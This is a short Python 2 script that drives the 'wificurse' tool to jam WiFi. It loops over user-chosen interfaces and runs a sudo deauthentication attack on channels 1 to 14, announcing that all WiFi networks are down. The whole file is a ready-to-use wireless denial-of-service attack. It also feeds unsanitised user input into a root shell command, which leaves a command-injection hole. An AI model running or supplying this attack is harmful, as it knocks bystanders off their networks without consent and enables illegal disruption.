import os

try:
	while True:
		print("*" * 60)
		print("[+] Interface List For Your System.")
		os.system("wificurse -l")
		print("[+] Choose 'wlx00c0ca975d5e' For your alfa Device")
		print("*" * 60)
		print("[+] Add Interfce name to begun atteck.")
		interface = raw_input("Interface :")
		print("*" * 60)
		os.system("sudo wificurse -c 1-14 " + interface)
		print("""[+] All WIFI Network are down successfully.
			[+] Press 'ctrl + c' to stop the script.""")

except Exception as e:
	print(str(e))